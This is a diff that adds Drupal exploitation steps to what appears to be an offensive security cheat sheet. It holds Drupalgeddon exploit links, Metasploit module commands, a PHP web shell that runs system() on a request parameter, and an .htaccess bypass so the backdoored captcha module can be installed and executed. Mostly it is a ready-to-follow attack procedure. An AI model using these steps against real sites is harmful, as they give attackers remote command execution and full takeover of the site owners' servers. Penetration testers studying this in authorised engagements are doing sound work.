@@ -1058,17 +1058,39 @@ $ python3 CVE-2019-10945.py --url "http://<domain name>/administrator/" --userna
 
 ```
 https://github.com/droope/droopescan
+https://www.exploit-db.com/exploits/34992
+https://www.exploit-db.com/exploits/44448
+https://github.com/rithchard/Drupalgeddon3
 $ curl -s <URL> | grep Drupal
 $ curl -s http://<domain name>/CHANGELOG.txt | grep -m2 ""
 $ droopescan scan drupal -u <URL>
+msf > use exploit/multi/http/drupal/drupageddon
+msf > use exploit/multi/http/drupal_drupageddon3
+
+
 # Before version 8 - Enable PHP Filter Module -> Save -> Create a basic page with PHP web shell -> Text Format = PHP code
+
 # After version 8 - $ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz -> Administration -> Reports -> Available updates -. Browse -> Install PHP Filter Module -> Save -> Create a basic page with PHP web shell -> Text Format = PHP code
+
 # Backdoored Module - $ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz -> Create PHP web shell with contents:
 <?php
 system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
 ?>
 
-Create 
+Create a .htaccess file (.html) to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder:
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+
+The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+
+$ mv shell.php .htaccess captcha
+$ tar cvf captcha.tar.gz captcha/
+
+Manage -> Extend -> + Install new module (http://<domain name>/admin/modules/install) -> Browse to Captcha archive -> Install -> Browse to /modules/captcha/shell.php to execute commands.
+
+$ python2.7 drupalgeddon.py -t <URL> -u hacker -p pwnd
 ```
 
 - Jenkins
